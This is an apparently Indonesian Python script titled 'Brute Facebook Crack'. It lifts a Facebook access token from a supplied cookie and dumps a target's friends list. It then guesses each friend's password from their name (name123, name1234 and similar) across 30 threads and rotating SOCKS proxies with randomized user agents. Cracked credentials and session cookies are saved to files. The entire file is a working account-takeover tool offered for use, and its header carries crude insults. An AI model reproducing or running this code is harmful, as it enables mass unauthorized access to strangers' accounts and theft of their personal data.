Author = 'Maulana-XD'
Status = 'Free'
Note = 'Jangan Jual Script Ini Kontol'
WahaiPenjualScript = 'LuKontol'

B = '\x1b[1;94m'
K = '\x1b[1;93m'
H = '\x1b[1;92m'
X = '\33[m'

import requests, sys, os, rich, datetime, time, random, re, platform, json, subprocess
from concurrent.futures import ThreadPoolExecutor as pericod

rr = random.randint
rc = random.choice
ses = requests.Session()

id,id2,tokenku,method,dump = [],[],[],[],[]
loop,ok,cp = 0,0,0

def clearlayar():
	os.system('clear')
	print(bannercrack)

def HapusCok():
	os.system('rm .tok.txt');os.system('rm .cok.txt');exit()

def back():
	MainMenu()

bannercrack = f"""╔═╗╦═╗╔═╗╔═╗╦╔═   ╔═╗╔╗  {H}Brute Facebook Crack{X}
║  ╠╦╝╠═╣║  ╠╩╗───╠╣ ╠╩╗ {H}Status {Status}{X}
╚═╝╩╚═╩ ╩╚═╝╩ ╩   ╚  ╚═╝ {H}Note {Note}{X}
"""

try:
	proxz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(proxz)
except Exception as e:
	print(' Jaringan Anda Bermasalah ')
proxz = open('proxy.txt','r').read().splitlines()

# -> KALO CP UBAH UA BAE, KALO GDA HASIL GANTI UA, UDH ITU AJA
def uAcrack():
	ver_andro = f"{str(random.randrange(2,8))}.{str(random.randrange(0,4))}.{str(random.randrange(0,4))}"
	samsung = random.choice(["SAMSUNG-SGH-I317 Build/JSS15J", "SGH-T999 Build/JSS15J", "SAMSUNG SM-T330 Build/KOT49H", "SAMSUNG SM-T530NU Build/LRX22G", "SAMSUNG-SM-N920A Build/LMY47X", "SAMSUNG-SM-G870A Build/LRX21T", "SAMSUNG SM-A500FU Build/LRX22G"])
	ugensam = f"Mozilla/5.0 (Linux; Android {ver_andro}; {samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randrange(80,120))}.0.{str(rr(4200,5700))}.{str(random.randrange(40,150))} Mobile Safari/537.36"
	uaku = rc([ugensam])
	return uaku

klender = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tanggal = datetime.datetime.now().day
bulan = klender[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
lives = 'LIVE-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
checks = 'CHECK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'

def login():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			Main()
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_cookie()

def login_cookie():
	clearlayar()
	cok = input(' Input Cookie Ngab : ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers = head, cookies = {"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(' Login Gagal Ngab, Ganti cookie ');time.sleep(2);exit()
		else:
			for JK in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={JK}&nav_source=no_referrer", headers = head, cookies = {"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f'\nToken Lu Ngab : {took} ');exit()
	except Exception as e:
		print(e)

def MainMenu():
	try:
		token = open('.tok.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:print(' Cookies Kedaluwarsa Ngab');login_cookie()
	clearlayar()
	print(f'[{B}1{X}] crack publik friends\n[{B}2{X}] log out')
	janda_tobrut = input(f'[{B}*{X}] pilih menu ngab : ')
	if janda_tobrut in ['1','01']:
		idt = input(f'\n[{B}*{X}] masukkan id target ngab : ')
		dump(idt,"",{"cookie":cok},token)
		setting_menu()
	elif janda_tobrut in ['2','02']:
		HapusCok()
	else:
		print(' pilih yang bener lah ngab ! ')
		exit()

def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

def setting_menu():
	for buat_random in id:
		tobrut = rr(0,len(id2))
		id2.insert(tobrut,buat_random)
	wordpass()

def wordpass():
	print(f'\n{X}[{B}*{X}] total id terkumpul {H}{len(id)}{X}')
	print(f'[{B}*{X}] mainkan mode pesawat setiap {H}230 id{X}\n')
	with pericod(max_workers=30) as pool:
		for tobrut_pink in id2:
			idf,nmf = tobrut_pink.split('|')[0],tobrut_pink.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'123456')
					pwv.append(frs+'0'+str(rr(0,9)))
					pwv.append(frs+'1'+str(rr(0,9)))
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'123456')
					pwv.append(frs+'0'+str(rr(0,9)))
					pwv.append(frs+'1'+str(rr(0,9)))
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)					
			else:
				pool.submit(crack,idf,pwv)

def crack(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{X}[{H}{idf}{X}] {loop} | {H}LIVE :-{ok}{X} | {K}CHECK :-{cp}{X} ")
	sys.stdout.flush()
	ua = uAcrack()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxz)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D1cc2e9593gAToVCgoVPZIGRmN2ExNDVjMmE4NGIzYmE1NTI0YmY4N2M0NTljN2Q1oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMt2h0dHBzOi8vd3d3LmNhcGN1dC5jb20voVTZIGRiNmNiZDc4NzJhNjJiNDgxZTk3MDAwNzZjYTcxYzRioVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad5b1170-376c-46b5-9400-05c86b297d44%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D1cc2e9593gAToVCgoVPZIGRmN2ExNDVjMmE4NGIzYmE1NTI0YmY4N2M0NTljN2Q1oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMt2h0dHBzOi8vd3d3LmNhcGN1dC5jb20voVTZIGRiNmNiZDc4NzJhNjJiNDgxZTk3MDAwNzZjYTcxYzRioVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'QNAp3VAVLmn2pxV22BS6D+KhA7UMFrZTRd8517HsLH6binIxQFEpokD3f0chpCtRp1VC3v8e8thFe+m0RzNuGA==','content-length': f'{len(str(data))}','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="{str(rr(80,120))}", "Not_A Brand";v="{str(rr(8,24))}"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D1cc2e9593gAToVCgoVPZIGRmN2ExNDVjMmE4NGIzYmE1NTI0YmY4N2M0NTljN2Q1oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMt2h0dHBzOi8vd3d3LmNhcGN1dC5jb20voVTZIGRiNmNiZDc4NzJhNjJiNDgxZTk3MDAwNzZjYTcxYzRioVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad5b1170-376c-46b5-9400-05c86b297d44%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D1cc2e9593gAToVCgoVPZIGRmN2ExNDVjMmE4NGIzYmE1NTI0YmY4N2M0NTljN2Q1oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMt2h0dHBzOi8vd3d3LmNhcGN1dC5jb20voVTZIGRiNmNiZDc4NzJhNjJiNDgxZTk3MDAwNzZjYTcxYzRioVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{X}[OK] {H}{idf}|{pw}{X}')
				open('LIVE/'+lives,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f'\r{X}[CP] {K}{idf}|{pw}{X}')
				open('CHECK/'+checks,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(33)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('LIVE')
	except:pass
	try:os.mkdir('CHECK')
	except:pass
	try:os.system('clear')
	except:pass
	MainMenu()